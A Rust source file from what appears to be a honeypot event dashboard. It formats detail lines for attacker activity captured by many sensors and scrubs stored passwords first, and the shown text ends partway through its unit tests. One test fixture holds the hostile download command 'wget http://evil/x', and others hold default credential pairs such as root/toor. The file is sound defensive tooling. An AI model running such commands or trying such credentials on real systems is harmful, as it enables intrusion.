//! Per-sensor event detail line rendering (#1611 workstream A), ported from
//! dashboard/classify.go's `classify()` — the legacy renderer's per-sensor
//! `switch` tree (~1040 lines across every sensor this stack runs).
//! `events.rs::row_from_source` (shared by the list endpoint and the SSE
//! live stream) calls `detail_for` in place of the bare `honeypot.event`/
//! `message` fallback it used before this file existed.
//!
//! Field reads throughout intentionally mirror classify.go's own field
//! names exactly (including sensors whose raw upstream shape
//! ip-enrichment-worker already flattens to lowercase before it reaches ES
//! — beelzebub/hellpot/galah/sentrypeer/wordpot — verified against
//! `src/ip_enrichment/sensors.rs`, which promotes those same flat keys).

use serde_json::Value;

use crate::secrets_boundary;

fn s(v: &Value) -> &str {
    v.as_str().unwrap_or("")
}

fn text(v: &Value) -> String {
    s(v).to_string()
}

/// Numeric-or-string field read, formatted without a trailing ".0" —
/// classify.go's `num()`: several sensors log a port/count as a JSON
/// number, others as a string.
fn num(v: &Value) -> String {
    if let Some(n) = v.as_i64() {
        return n.to_string();
    }
    if let Some(n) = v.as_f64() {
        if n != 0.0 {
            return format!("{n}");
        }
        return String::new();
    }
    text(v)
}

fn num_float(v: &Value) -> f64 {
    v.as_f64().unwrap_or(0.0)
}

/// Pick the first non-empty string from a slice of &str.
/// Renamed from `first_non_empty` to avoid colliding with the
/// `&[&'a Value]`-shaped sibling further down in this file.
fn first_non_empty_strs(vals: &[&str]) -> String {
    vals.iter().find(|v| !v.is_empty()).unwrap_or(&"").to_string()
}

/// classify.go's `shortHash`: first 12 hex chars of a sha256, for compact
/// display.
fn short_hash(h: &str) -> String {
    if h.len() > 12 {
        h[..12].to_string()
    } else {
        h.to_string()
    }
}

/// classify.go's `severityLabel` — suricata's numeric alert.severity
/// (1 = most severe) as a short bracketed label.
fn severity_label(sev: i64) -> String {
    match sev {
        1 => "[severity 1/critical]".to_string(),
        2 => "[severity 2/major]".to_string(),
        3 => "[severity 3/minor]".to_string(),
        _ => format!("[severity {sev}]"),
    }
}

/// classify.go's `metaFirst`: eve.json always encodes alert.metadata
/// values as a JSON array even for a single value.
fn meta_first(metadata: &Value, key: &str) -> String {
    metadata[key].as_array().and_then(|a| a.first()).and_then(|v| v.as_str()).unwrap_or("").to_string()
}

/// classify.go's `mitreSuffix`.
fn mitre_suffix(metadata: &Value) -> String {
    let tactic_id = meta_first(metadata, "mitre_tactic_id");
    let tactic_name = meta_first(metadata, "mitre_tactic_name");
    let tech_id = meta_first(metadata, "mitre_technique_id");
    let tech_name = meta_first(metadata, "mitre_technique_name");
    if tactic_id.is_empty() && tech_id.is_empty() {
        return String::new();
    }
    let mut parts = Vec::new();
    if !tactic_id.is_empty() {
        parts.push(format!("{tactic_id} {tactic_name}").trim().to_string());
    }
    if !tech_id.is_empty() {
        parts.push(format!("{tech_id} {tech_name}").trim().to_string());
    }
    format!("ATT&CK: {}", parts.join(" / "))
}

/// classify.go's `dnsQTypeName` — deliberately incomplete, matches source.
fn dns_qtype_name(qtype: i64) -> &'static str {
    match qtype {
        1 => "A",
        2 => "NS",
        5 => "CNAME",
        6 => "SOA",
        12 => "PTR",
        15 => "MX",
        16 => "TXT",
        28 => "AAAA",
        33 => "SRV",
        255 => "ANY",
        _ => "",
    }
}

/// classify.go's `opcodeName` — 0 (QUERY) deliberately absent, not worth
/// flagging.
fn opcode_name(opcode: i64) -> &'static str {
    match opcode {
        1 => "IQUERY",
        2 => "STATUS",
        4 => "NOTIFY",
        5 => "UPDATE",
        _ => "",
    }
}

/// classify.go's `tannerDetectionName`.
fn tanner_detection_name(hp: &Value) -> String {
    text(&hp["response_msg"]["response"]["message"]["detection"]["name"])
}

/// classify.go's `tannerDetectionPayload` — truncated for display.
fn tanner_detection_payload(hp: &Value) -> String {
    let v = text(&hp["response_msg"]["response"]["message"]["detection"]["payload"]["value"]);
    if v.chars().count() > 1000 {
        let truncated: String = v.chars().take(1000).collect();
        format!("{truncated}(...)")
    } else {
        v
    }
}

/// classify.go's dicompot `dicomEventLabels`.
fn dicom_event_label(kind: &str) -> &str {
    match kind {
        "connect" => "connect",
        "associate" => "A-ASSOCIATE",
        "c_echo" => "C-ECHO",
        "c_find" => "C-FIND",
        "c_move" => "C-MOVE",
        "c_get" => "C-GET",
        "c_store" => "C-STORE",
        _ => kind,
    }
}

/// Renders one event's detail line from its flattened `honeypot.*` (`hp`)
/// and/or `suricata.eve.*` (`eve`) sub-documents, keyed by `event.sensor`.
/// `src` is the full `_source` document, for the handful of sensors that
/// read fields outside `honeypot.*`/`suricata.eve.*` (network.protocol
/// fallbacks, top-level message).
pub fn detail_for(sensor: &str, src: &Value) -> String {
    // #3213: the boundary is applied HERE, once, before the dispatch, rather
    // than at each of the reads below that can reach a credential. Six
    // `hp["password"]` reads live in this file's per-sensor functions and
    // more arrive with every sensor added; a read site that forgets to think
    // about the secret cannot leak one, because the field is already gone by
    // the time it runs. `unwrap_or` keeps the out-of-scope sensors on the
    // original borrow -- cowrie, tanner and the rest are unchanged by this,
    // and `scrub_event` returns `None` for them rather than a clone.
    let scrubbed = secrets_boundary::scrub_event(sensor, &src["honeypot"]);
    let hp = scrubbed.as_ref().unwrap_or(&src["honeypot"]);
    let eve = &src["suricata"]["eve"];

    match sensor {
        "cowrie" => cowrie_detail(hp),
        "multipot" => multipot_detail(hp),
        "dicompot" => dicompot_detail(hp),
        "dnp3" => dnp3_detail(hp),
        "dns-honeypot" => dns_honeypot_detail(hp),
        "citrix-honeypot" => citrix_detail(hp),
        "cisco-asa-honeypot" => cisco_asa_detail(sensor, hp),
        "rdp-honeypot" => rdp_detail(hp),
        "beelzebub" => beelzebub_detail(hp),
        "hellpot" => hellpot_detail(hp),
        "elasticpot" => elasticpot_detail(hp),
        "galah" => galah_detail(hp),
        "sentrypeer" => sentrypeer_detail(hp),
        "wordpot" => wordpot_detail(hp),
        "mailoney" => mailoney_detail(hp),
        "canarytokens" => canarytokens_detail(hp),
        "endlessh" => endlessh_detail(hp),
        "dionaea" => dionaea_detail(hp),
        "tanner" => tanner_or_http_detail(sensor, hp),
        "http-honeypot" | "http" | "api-honeypot" => tanner_or_http_detail(sensor, hp),
        "suricata" => suricata_detail(eve),
        s if s.starts_with("conpot") => conpot_detail(hp),
        _ => {
            let d = text(&hp["event"]);
            if d.is_empty() {
                text(&src["message"])
            } else {
                d
            }
        }
    }
}

fn cowrie_detail(hp: &Value) -> String {
    let eid = s(&hp["eventid"]);
    let short = eid.strip_prefix("cowrie.").unwrap_or(eid);
    let user = s(&hp["username"]);
    let pass = s(&hp["password"]);
    match eid {
        "cowrie.login.success" | "cowrie.login.failed" => {
            let mut d = format!("{short}: {user} / {pass}");
            let fp = s(&hp["fingerprint"]);
            if !fp.is_empty() {
                d += &format!(" (key {})", short_hash(fp));
            }
            d
        }
        "cowrie.command.input" | "cowrie.command.failed" | "cowrie.command.success" | "cowrie.session.input" => {
            format!("cmd: {}", s(&hp["input"]))
        }
        "cowrie.command.chpasswd" => format!("chpasswd attempt: {user}"),
        "cowrie.session.file_download" | "cowrie.session.file_upload" => {
            let shasum = s(&hp["shasum"]);
            let download = first_non_empty_strs(&[s(&hp["destfile"]), s(&hp["url"]), s(&hp["filename"])]);
            let mut d = format!("payload {}", short_hash(shasum));
            if !download.is_empty() {
                d += &format!(" -> {download}");
            }
            d
        }
        "cowrie.session.file_download.failed" => {
            let url = s(&hp["url"]);
            let mut d = format!("download failed: {url}");
            let err = s(&hp["error"]);
            if !err.is_empty() {
                d += &format!(" ({err})");
            }
            d
        }
        "cowrie.client.version" => format!("client: {}", s(&hp["version"])),
        "cowrie.client.kex" => format!("SSH HASSH: {}", s(&hp["hassh"])),
        "cowrie.client.size" => format!("terminal {}x{}", num(&hp["width"]), num(&hp["height"])),
        "cowrie.direct-tcpip.request" => format!("port-forward request -> {}:{}", s(&hp["dst_ip"]), num(&hp["dst_port"])),
        "cowrie.direct-tcpip.ja4" => {
            format!("JA4 (tunneled TLS to {}:{}): {}", s(&hp["dst_ip"]), num(&hp["dst_port"]), s(&hp["ja4"]))
        }
        "cowrie.direct-tcpip.ja4h" => {
            format!("JA4H (tunneled HTTP to {}:{}): {}", s(&hp["dst_ip"]), num(&hp["dst_port"]), s(&hp["ja4h"]))
        }
        "cowrie.client.fingerprint" => {
            format!("pubkey offered ({}): {}", s(&hp["type"]), short_hash(s(&hp["fingerprint"])))
        }
        "cowrie.telnet.exploit_attempt" => {
            format!("CVE {} attempt: {}={}", s(&hp["cve"]), s(&hp["name"]), s(&hp["value"]))
        }
        "cowrie.telnet.exploit_success" => format!("CVE {} succeeded, logged in as {}", s(&hp["cve"]), user),
        "cowrie.log.closed" => {
            let ttylog = s(&hp["ttylog"]);
            let mut d = "TTY session recorded".to_string();
            if !ttylog.is_empty() {
                d += &format!(": {ttylog}");
            }
            d
        }
        "cowrie.session.connect" => "connect".to_string(),
        "cowrie.session.closed" => {
            let dur = num(&hp["duration_ms"]);
            if dur.is_empty() {
                "closed".to_string()
            } else {
                format!("closed after {dur}ms")
            }
        }
        _ => first_non_empty_strs(&[s(&hp["message"]), short]),
    }
}

fn multipot_detail(hp: &Value) -> String {
    let proto = s(&hp["proto"]);
    let kind = s(&hp["event"]);
    let user = s(&hp["username"]);
    let pass = s(&hp["password"]);
    let mut d = match kind {
        "login" => format!("{proto} login: {user} / {pass}"),
        "command" => format!("{proto}: {}", s(&hp["command"])),
        _ => format!("{proto} {kind}"),
    };
    if kind != "command" {
        let cmd = s(&hp["command"]);
        if !cmd.is_empty() {
            d += &format!(": {cmd}");
        }
    }
    let data = s(&hp["data"]);
    if !data.is_empty() {
        d += &format!("  {data}");
    }
    let client = s(&hp["client"]);
    if !client.is_empty() {
        d += &format!("  client: {client}");
    }
    d
}

fn dicompot_detail(hp: &Value) -> String {
    let kind = s(&hp["event"]);
    let mut d = dicom_event_label(kind).to_string();
    let called = s(&hp["called_ae"]);
    if !called.is_empty() {
        d += &format!(" called={called}");
    }
    let calling = s(&hp["calling_ae"]);
    if !calling.is_empty() {
        d += &format!(" calling={calling}");
    }
    let data = s(&hp["data"]);
    if !data.is_empty() {
        d += &format!(" {data}");
    }
    let bytes = num(&hp["bytes"]);
    if !bytes.is_empty() {
        d += &format!(" ({bytes} bytes)");
    }
    d
}

fn dnp3_detail(hp: &Value) -> String {
    let kind = s(&hp["event"]);
    match kind {
        "frame" => {
            let mut d = format!("link {}", s(&hp["function"]));
            let app = s(&hp["app_function"]);
            if !app.is_empty() {
                d += &format!(", app {app}");
            }
            let src_addr = num(&hp["dnp3_source"]);
            let dst_addr = num(&hp["dnp3_destination"]);
            if !src_addr.is_empty() || !dst_addr.is_empty() {
                d += &format!(" (src {src_addr} -> dst {dst_addr})");
            }
            d
        }
        "malformed_frame" => "malformed frame".to_string(),
        _ => kind.to_string(),
    }
}

fn dns_honeypot_detail(hp: &Value) -> String {
    let kind = s(&hp["event"]);
    let query = s(&hp["query"]);
    let mut d = if query.is_empty() {
        kind.to_string()
    } else {
        let mut d = format!("query {query}");
        let qt = dns_qtype_name(num_float(&hp["qtype"]) as i64);
        if !qt.is_empty() {
            d += &format!(" ({qt})");
        }
        d
    };
    let op = opcode_name(num_float(&hp["opcode"]) as i64);
    if !op.is_empty() {
        d += &format!(" [opcode {op}]");
    }
    if kind.ends_with("_dropped") {
        d += " [response suppressed, amplification cap]";
    }
    d
}

fn citrix_detail(hp: &Value) -> String {
    let kind = s(&hp["event"]);
    let path = s(&hp["path"]);
    let mut d = format!("{kind} {path}").trim().to_string();
    if kind == "cve_2019_19781_payload" {
        d += &format!("  payload: {}", s(&hp["data"]));
    }
    d
}

fn cisco_asa_detail(sensor: &str, hp: &Value) -> String {
    let kind = s(&hp["event"]);
    let path = s(&hp["path"]);
    let mut d = format!("{kind} {path}").trim().to_string();
    // #3213: the ASA's axes too, on the same terms as the HTTP decoy. The
    // IKE events reach here with `unknown` on both, which is the honest
    // answer -- nothing in a UDP key exchange carries a login -- and the
    // fragment is what makes that visible instead of leaving the line bare.
    // The account is still shown: a username is the analytic value (a spray
    // is a spray of accounts) and it is not a secret.
    let user = s(&hp["username"]);
    if !user.is_empty() {
        d += &format!("  ({user})");
    }
    if let Some(state) = credential_state_fragment(sensor, hp) {
        d += &format!("  [{state}]");
    }
    match kind {
        "cve_2018_0101_payload" => d += &format!("  payload: {}", s(&hp["data"])),
        "post" => {
            let body = s(&hp["data"]);
            if !body.is_empty() {
                d += &format!("  body: {body}");
            }
        }
        _ => {}
    }
    if kind == "ike_unexpected_exchange" {
        let data = s(&hp["data"]);
        if !data.is_empty() {
            d += &format!(" (type {data})");
        }
    }
    d
}

fn rdp_detail(hp: &Value) -> String {
    let user = s(&hp["username"]);
    let mut d = "connect".to_string();
    if !user.is_empty() {
        d += &format!("  mstshash: {user}");
    }
    let proto = s(&hp["requested_protocols"]);
    if !proto.is_empty() {
        d += &format!("  security: {proto}");
    }
    d
}

fn beelzebub_detail(hp: &Value) -> String {
    let user = s(&hp["username"]);
    let pass = s(&hp["password"]);
    let cmd = s(&hp["command"]);
    let path = s(&hp["path"]);
    if !cmd.is_empty() {
        format!("cmd: {cmd}")
    } else if !user.is_empty() || !pass.is_empty() {
        format!("auth: {user} / {pass}")
    } else if !path.is_empty() {
        format!("request: {path}")
    } else {
        text(&hp["Status"])
    }
}

fn hellpot_detail(hp: &Value) -> String {
    let path = s(&hp["path"]);
    let message = s(&hp["message"]);
    if message == "FINISH" {
        format!("tarpitted {} bytes over {}ms: {}", num(&hp["BYTES"]), num(&hp["DURATION"]), path)
    } else if !path.is_empty() {
        format!("request: {path}")
    } else {
        message.to_string()
    }
}

fn elasticpot_detail(hp: &Value) -> String {
    let path = s(&hp["url"]);
    let payload = s(&hp["payload"]);
    let request = s(&hp["request"]);
    if !payload.is_empty() {
        format!("{request} {path}  payload: {payload}")
    } else if !path.is_empty() {
        format!("{request} {path}")
    } else {
        text(&hp["message"])
    }
}

fn galah_detail(hp: &Value) -> String {
    let path = s(&hp["path"]);
    // #3666: a failed LLM call is indexed as an event too, but nothing was
    // generated or served for it, so it must not read as a response.
    if s(&hp["response_outcome"]) == "llm_failed" {
        return if path.is_empty() {
            "LLM call failed, no response served".to_string()
        } else {
            format!("LLM call failed, no response served: {path}")
        };
    }
    if !path.is_empty() {
        format!("LLM-generated response: {path}")
    } else {
        text(&hp["msg"])
    }
}

fn sentrypeer_detail(hp: &Value) -> String {
    let method = s(&hp["sip_method"]);
    let called = s(&hp["called_number"]);
    if !called.is_empty() {
        format!("{method} -> {called}")
    } else {
        method.to_string()
    }
}

fn wordpot_detail(hp: &Value) -> String {
    let path = s(&hp["path"]);
    let user = s(&hp["username"]);
    let pass = s(&hp["password"]);
    let plugin = s(&hp["plugin"]);
    let theme = s(&hp["theme"]);
    if !pass.is_empty() {
        format!("auth: {user} / {pass}")
    } else if !plugin.is_empty() {
        format!("plugin probe: {plugin}  {path}")
    } else if !theme.is_empty() {
        format!("theme probe: {theme}  {path}")
    } else if !user.is_empty() {
        format!("author enum: {user}")
    } else if !path.is_empty() {
        format!("request: {path}")
    } else {
        text(&hp["message"])
    }
}

fn mailoney_detail(hp: &Value) -> String {
    let user = s(&hp["username"]);
    let pass = s(&hp["password"]);
    match s(&hp["event"]) {
        "login" => format!("AUTH PLAIN: {user} / {pass}"),
        "envelope" => text(&hp["command"]),
        "mail-body" => {
            let size = &hp["size"];
            let size_str = if let Some(n) = size.as_i64() { n.to_string() } else { text(size) };
            let mut d = format!("DATA: {size_str} bytes");
            let path = s(&hp["body_path"]);
            if !path.is_empty() {
                d += &format!("  saved: {path}");
            }
            d
        }
        other => other.to_string(),
    }
}

fn canarytokens_detail(hp: &Value) -> String {
    let memo = s(&hp["memo"]);
    let channel = s(&hp["channel"]);
    let token_type = s(&hp["token_type"]);
    if !memo.is_empty() && !channel.is_empty() {
        format!("token fired: {memo}  ({channel})")
    } else if !memo.is_empty() {
        format!("token fired: {memo}")
    } else {
        format!("token fired ({token_type})")
    }
}

fn endlessh_detail(hp: &Value) -> String {
    match s(&hp["event"]) {
        "connect" => "tarpit connect".to_string(),
        "disconnect" => {
            let ms = num_float(&hp["held_ms"]) as i64;
            let lines = num_float(&hp["lines"]) as i64;
            format!("tarpit held {ms}ms, {lines} banner lines sent")
        }
        other => other.to_string(),
    }
}

fn dionaea_detail(hp: &Value) -> String {
    // Incident shape (origin: "dionaea.*", data: {...}) takes priority —
    // richer than the plain connection-summary shape below.
    let origin = s(&hp["origin"]);
    if let Some(kind) = origin.strip_prefix("dionaea.") {
        let data = &hp["data"];
        let mut d = kind.to_string();
        let name = s(&data["name"]);
        if !name.is_empty() {
            d = name.to_string();
            let cve = s(&data["cve"]);
            if !cve.is_empty() {
                d += &format!(" ({cve})");
            }
        }
        let download = first_non_empty_strs(&[s(&data["url"]), s(&data["path"]), s(&data["file"]), s(&data["filename"])]);
        if !download.is_empty() {
            d += &format!(" {download}");
        }
        let mut shasum = first_non_empty_strs(&[
            s(&data["sha256"]),
            s(&data["sha256hash"]),
            s(&data["sha1"]),
            s(&data["md5"]),
            s(&data["md5hash"]),
        ]);
        if shasum.is_empty() && !download.is_empty() {
            let base = download.rsplit('/').next().unwrap_or(&download);
            if base.len() >= 32 && base.len() <= 64 && base.chars().all(|c| c.is_ascii_hexdigit()) {
                shasum = base.to_string();
            }
        }
        if !shasum.is_empty() && !d.contains(&shasum) {
            d += &format!(" [{}]", short_hash(&shasum));
        }
        let uuid = s(&data["uuid"]);
        if !uuid.is_empty() {
            d += &format!(" uuid={uuid}");
            let opnum = num(&data["opnum"]);
            if !opnum.is_empty() {
                d += &format!(" opnum={opnum}");
            }
            let ts = s(&data["transfersyntax"]);
            if !ts.is_empty() {
                d += &format!(" transfersyntax={ts}");
            }
        }
        return d;
    }

    // Connection-summary shape (log_json): one record per connection.
    let conn = &hp["connection"];
    if conn.is_object() {
        let proto = s(&conn["protocol"]);
        let transport = s(&conn["transport"]);
        let kind = s(&conn["type"]);
        let mut d = format!("{proto}/{transport} {kind}").trim().to_string();
        let port = first_non_empty_strs(&[&num(&hp["dst_port"]), &num(&conn["local_port"])]);
        if !port.is_empty() {
            d += &format!(" -> :{port}");
        }
        return d;
    }

    text(&hp["event"])
}

fn conpot_detail(hp: &Value) -> String {
    let proto = s(&hp["data_type"]);
    let req = first_non_empty_strs(&[s(&hp["request"]), s(&hp["event_type"])]);
    let mut d = format!("{proto} {req}").trim().to_string();
    if d.is_empty() {
        d = "probe".to_string();
    }
    let resp = s(&hp["response"]);
    if !resp.is_empty() {
        d += &format!("  -> {resp}");
    }
    d
}

/// tanner_report.json (method/path/headers shape) and http-honeypot share
/// this request-log shape in classify.go.
fn tanner_or_http_detail(sensor: &str, hp: &Value) -> String {
    let method = s(&hp["method"]);
    let path = s(&hp["path"]);
    let user = s(&hp["username"]);
    let pass = s(&hp["password"]);
    let mut d = format!("{method} {path}").trim().to_string();
    // #3213: the `/ pass` half is rendered only when the document actually
    // still carries a secret. http-honeypot no longer stores one, and the
    // boundary has removed it from the ones stored before the fix, so
    // `{user} / {pass}` would now print a dangling separator and a permanent
    // empty half. tanner is out of scope, keeps its secret, and is
    // byte-identical to before.
    let state = credential_state_fragment(sensor, hp);
    match state {
        Some(state) => {
            if !user.is_empty() {
                d += &format!("  ({user})");
            }
            d += &format!("  [{state}]");
        }
        None => {
            if !user.is_empty() || !pass.is_empty() {
                d += &format!("  ({user} / {pass})");
            }
        }
    }
    if hp["tarpitted"].as_bool() == Some(true) {
        let ms = num_float(&hp["tarpit_ms"]) as i64;
        let kb = num_float(&hp["tarpit_bytes"]) / 1024.0;
        d += &format!("  [tarpitted {ms}ms, {kb:.1}KB]");
    }
    let name = tanner_detection_name(hp);
    if !name.is_empty() && name != "index" {
        d += &format!("  [{name}]");
        if let Some(post_data) = hp["post_data"].as_object() {
            if !post_data.is_empty() {
                let mut parts: Vec<String> = post_data.iter().map(|(k, v)| format!("{k}={}", text(v))).collect();
                parts.sort();
                d += &format!("  payload: {}", parts.join("&"));
            }
        }
        if let Some(cookies) = hp["cookies"].as_object() {
            if !cookies.is_empty() {
                let mut parts: Vec<String> = cookies.iter().map(|(k, v)| format!("{k}={}", text(v))).collect();
                parts.sort();
                d += &format!("  cookies: {}", parts.join("; "));
            }
        }
        let payload = tanner_detection_payload(hp);
        if !payload.is_empty() {
            d += &format!("  result: {payload}");
        }
    }
    d
}

/// Renders #3213's three axes as one bracketed detail fragment.
///
/// `None` for a sensor this issue does not cover, which is what keeps tanner
/// on the `{user} / {pass}` line it has always rendered.
///
/// A document on the pre-fix schema is the case worth reading twice. It has
/// no `credential_status`, and the boundary has just removed the `password`
/// field that was the only evidence of a credential in it -- so reporting
/// "absent" would be reporting the scrubber's own effect back to the analyst
/// as an observation about the attacker. It says the secret was removed and
/// stops there, which is the one claim still true.
fn credential_state_fragment(sensor: &str, hp: &Value) -> Option<String> {
    let status = s(&hp["credential_status"]);
    if status.is_empty() {
        return secrets_boundary::is_credential_bearing(sensor, hp).then(|| "credentials removed".to_string());
    }
    let mut parts = vec![status.replace('_', " ")];
    // The indicator is an ATTEMPT matched against this fleet's own bait
    // values, not a verdict that the credential worked -- so it is worded as
    // a match and nothing more.
    if hp["credential_indicator_match"].as_bool() == Some(true) {
        parts.push("decoy indicator".to_string());
    }
    let outcome = s(&hp["auth_outcome"]);
    if !outcome.is_empty() {
        parts.push(format!("auth {outcome}"));
    }
    Some(parts.join(" · "))
}

/// `dns`/`fileinfo` are new (#1611 workstream A) — classify.go's legacy
/// renderer excluded every suricata event_type except alert/anomaly
/// outright (`ev.skip = true`), the same posture this crate keeps for
/// flow/netflow/stats (see events.rs's query-level exclusion) since those
/// three would swamp the default view with high-volume, low-signal rows.
fn suricata_detail(eve: &Value) -> String {
    let event_type = s(&eve["event_type"]);
    match event_type {
        "alert" => {
            let alert = &eve["alert"];
            let signature = s(&alert["signature"]);
            let category = s(&alert["category"]);
            let severity = alert["severity"].as_i64().unwrap_or(0);
            let mut d = signature.to_string();
            if !category.is_empty() {
                d += &format!("  [{category}]");
            }
            if severity > 0 {
                d += &format!("  {}", severity_label(severity));
            }
            let metadata = &alert["metadata"];
            if metadata.is_object() {
                let mitre = mitre_suffix(metadata);
                if !mitre.is_empty() {
                    d += &format!("  {mitre}");
                }
            }
            if d.is_empty() {
                d = "alert".to_string();
            }
            let payload = s(&eve["payload_printable"]);
            if !payload.is_empty() {
                d += &format!("  payload: {payload}");
            } else {
                let body = first_non_empty_strs(&[
                    s(&eve["http"]["http_request_body_printable"]),
                    s(&eve["http"]["http_response_body_printable"]),
                    s(&eve["http"]["http_body_printable"]),
                ]);
                if !body.is_empty() {
                    d += &format!("  body: {body}");
                }
            }
            d += &captured_bytes_suffix(eve);
            d
        }
        "anomaly" => {
            let anomaly = &eve["anomaly"];
            let event = s(&anomaly["event"]);
            let app_proto = s(&anomaly["app_proto"]);
            let mut d = event.to_string();
            if !app_proto.is_empty() {
                d += &format!("  [{app_proto}]");
            }
            let layer = s(&anomaly["layer"]);
            if !layer.is_empty() {
                d += &format!("  (layer: {layer})");
            }
            if d.is_empty() {
                d = "alert".to_string();
            }
            d
        }
        "http" => {
            let http = &eve["http"];
            format!("{} {} {}", s(&http["http_method"]), s(&http["url"]), num(&http["status"])).trim().to_string()
        }
        "tls" => {
            let tls = &eve["tls"];
            format!("TLS {} JA4 {} SNI {}", s(&tls["version"]), s(&tls["ja4"]), s(&tls["sni"])).trim().to_string()
        }
        "ssh" => {
            let ssh = &eve["ssh"];
            let client = s(&ssh["client"]["software_version"]);
            let server = s(&ssh["server"]["software_version"]);
            format!("SSH client {client} / server {server}").trim().to_string()
        }
        "smtp" => {
            let smtp = &eve["smtp"];
            format!("HELO {} MAIL FROM {}", s(&smtp["helo"]), s(&smtp["mail_from"])).trim().to_string()
        }
        "dns" => {
            let dns = &eve["dns"];
            let rrname = s(&dns["rrname"]);
            let rrtype = s(&dns["rrtype"]);
            if rrtype.is_empty() {
                format!("query {rrname}")
            } else {
                format!("query {rrname} ({rrtype})")
            }
        }
        "fileinfo" => {
            let fileinfo = &eve["fileinfo"];
            format!("{} ({} bytes)", s(&fileinfo["filename"]), num(&fileinfo["size"]))
        }
        other => other.to_string(),
    }
}

/// #2334: suricata.yaml's alert stanza turns on `payload`, `packet` and
/// `http-body` — the raw, non-printable base64 siblings of the
/// `*_printable` fields already rendered above. Those bytes were captured
/// (at real I/O + Elasticsearch storage cost) and then never surfaced
/// anywhere: not in this detail line, not as a link on the event page.
/// This flags that they exist without inlining them — a multi-KB base64
/// blob stretched across a table row is not "surfaced", it's noise, and
/// operators reach the real bytes by opening the event (its full,
/// undecoded record already renders on `/event/{id}`). Byte counts, not
/// content, so the fix stays a pointer rather than a second copy of the
/// dump.
fn captured_bytes_suffix(eve: &Value) -> String {
    let mut parts = Vec::new();
    if let Some(size) = base64_decoded_len(&eve["packet"]) {
        parts.push(format!("packet capture: {size} bytes"));
    }
    if let Some(size) = base64_decoded_len(&eve["http"]["http_request_body"]) {
        parts.push(format!("request body: {size} bytes"));
    }
    if let Some(size) = base64_decoded_len(&eve["http"]["http_response_body"]) {
        parts.push(format!("response body: {size} bytes"));
    }
    if parts.is_empty() {
        return String::new();
    }
    format!("  [{} — full record on the event page]", parts.join(", "))
}

/// Decoded byte length of a base64 field, or `None` if absent/empty/invalid.
fn base64_decoded_len(value: &Value) -> Option<usize> {
    use base64::Engine;
    let encoded = value.as_str().filter(|v| !v.is_empty())?;
    base64::engine::general_purpose::STANDARD
        .decode(encoded)
        .ok()
        .map(|bytes| bytes.len())
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn src(sensor: &str, honeypot: Value) -> Value {
        json!({"event": {"sensor": sensor}, "honeypot": honeypot})
    }

    #[test]
    fn galah_failed_llm_call_is_not_described_as_a_generated_response() {
        let ok = src("galah", json!({"path": "/admin"}));
        assert_eq!(detail_for("galah", &ok), "LLM-generated response: /admin");
        let failed = src("galah", json!({"path": "/admin", "response_outcome": "llm_failed"}));
        assert_eq!(detail_for("galah", &failed), "LLM call failed, no response served: /admin");
    }

    #[test]
    fn cowrie_login_failed_includes_user_and_pass() {
        let v = src("cowrie", json!({"eventid": "cowrie.login.failed", "username": "root", "password": "toor"}));
        assert_eq!(detail_for("cowrie", &v), "login.failed: root / toor");
    }

    #[test]
    fn cowrie_login_success_appends_pubkey_fingerprint() {
        let v = src(
            "cowrie",
            json!({"eventid": "cowrie.login.success", "username": "root", "password": "", "fingerprint": "aabbccddeeff00112233445566778899"}),
        );
        assert_eq!(detail_for("cowrie", &v), "login.success: root /  (key aabbccddeeff)");
    }

    #[test]
    fn cowrie_command_input_is_cmd_prefixed() {
        let v = src("cowrie", json!({"eventid": "cowrie.command.input", "input": "wget http://evil/x"}));
        assert_eq!(detail_for("cowrie", &v), "cmd: wget http://evil/x");
    }

    #[test]
    fn cowrie_file_download_shows_shorthash_and_destination() {
        let v = src(
            "cowrie",
            json!({"eventid": "cowrie.session.file_download", "shasum": "0123456789abcdef0123456789abcdef", "destfile": "/tmp/x"}),
        );
        assert_eq!(detail_for("cowrie", &v), "payload 0123456789ab -> /tmp/x");
    }

    #[test]
    fn cowrie_log_closed_shows_ttylog() {
        let v = src("cowrie", json!({"eventid": "cowrie.log.closed", "ttylog": "deadbeef.ttylog"}));
        assert_eq!(detail_for("cowrie", &v), "TTY session recorded: deadbeef.ttylog");
    }

    #[test]
    fn cowrie_unknown_eventid_falls_back_to_message() {
        let v = src("cowrie", json!({"eventid": "cowrie.some.new.thing", "message": "a human readable line"}));
        assert_eq!(detail_for("cowrie", &v), "a human readable line");
    }

    #[test]
    fn dionaea_incident_prefers_name_and_cve_over_module_path() {
        let v = src(
            "dionaea",
            json!({"origin": "dionaea.modules.python.smb.exploit", "data": {"name": "DoublePulsar connection attempt", "cve": "CVE-2017-0144"}}),
        );
        assert_eq!(detail_for("dionaea", &v), "DoublePulsar connection attempt (CVE-2017-0144)");
    }

    #[test]
    fn dionaea_connection_summary_shape() {
        let v = src("dionaea", json!({"connection": {"protocol": "smbd", "transport": "tcp", "type": "accept", "local_port": 445}}));
        assert_eq!(detail_for("dionaea", &v), "smbd/tcp accept -> :445");
    }

    #[test]
    fn multipot_login_includes_proto_user_pass() {
        let v = src("multipot", json!({"proto": "postgres", "event": "login", "username": "postgres", "password": "postgres"}));
        assert_eq!(detail_for("multipot", &v), "postgres login: postgres / postgres");
    }

    #[test]
    fn conpot_shows_request_and_response() {
        let v = src("conpot-guardian", json!({"data_type": "guardian_ast", "request": "in_tank_inventory", "response": "TANK 1 PRODUCT UNLEADED VOLUME 8500"}));
        assert_eq!(
            detail_for("conpot-guardian", &v),
            "guardian_ast in_tank_inventory  -> TANK 1 PRODUCT UNLEADED VOLUME 8500"
        );
    }

    #[test]
    fn beelzebub_reads_flat_promoted_fields_not_nested_event_object() {
        let v = src("beelzebub", json!({"protocol": "ssh", "username": "admin", "password": "admin123", "command": ""}));
        assert_eq!(detail_for("beelzebub", &v), "auth: admin / admin123");
    }

    #[test]
    fn dns_honeypot_shows_query_and_qtype() {
        let v = src("dns-honeypot", json!({"event": "query", "query": "evil.example.", "qtype": 1}));
        assert_eq!(detail_for("dns-honeypot", &v), "query evil.example. (A)");
    }

    #[test]
    fn dns_honeypot_dropped_query_notes_suppression() {
        let v = src("dns-honeypot", json!({"event": "query_dropped", "query": "big.example.", "qtype": 16}));
        assert_eq!(detail_for("dns-honeypot", &v), "query big.example. (TXT) [response suppressed, amplification cap]");
    }

    #[test]
    fn tanner_surfaces_detection_name_and_payload() {
        let v = src(
            "tanner",
            json!({
                "method": "POST", "path": "/index.php",
                "response_msg": {"response": {"message": {"detection": {"name": "cmd_exec", "payload": {"value": "uid=0(root)"}}}}}
